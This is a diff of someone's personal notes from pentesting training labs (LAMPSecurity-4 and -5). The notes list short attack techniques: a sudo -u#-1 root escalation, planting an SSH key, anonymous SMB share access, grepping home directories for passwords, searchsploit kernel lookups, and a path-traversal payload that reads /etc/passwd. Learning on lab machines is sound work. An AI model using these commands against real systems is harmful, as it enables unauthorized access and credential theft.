@@ -20,3 +20,19 @@ I can run any commande with root priviledge like this: sudo -u#-1 /bin/bash  => 
 ALso: user  ALL=(ALL,!abdo) ALL, I can have root access: sudo -u#-1 /bin/bash
 bug fixed in 1.8.28  => get your current version $ sudo -V
 ```
+#### LAMPSecurity-4
+what I had learn from this machine is:
+```
+authenticity with private key with ssh : copy my public key to .ssh/authorized_key 
+id => cat /etc/group, find / -group grp_name -type f 2>/dev/null
+```
+#### LAMPSecurity-5
+what I had learn from this machine is:
+```
+smbclient --list //10.0.4.13/ -U "" : list the shared folders
+smbclient //10.0.4.13/folder/ -U "" : get in 
+grep -Ri password /home/*   : 
+searchsploit linux kernel 2.6 : deux chiffre
+ls /etc | grep release : know the distribution of the OS
+https://10.0.4.13/?page=/../../../etc/passwd%00
+```
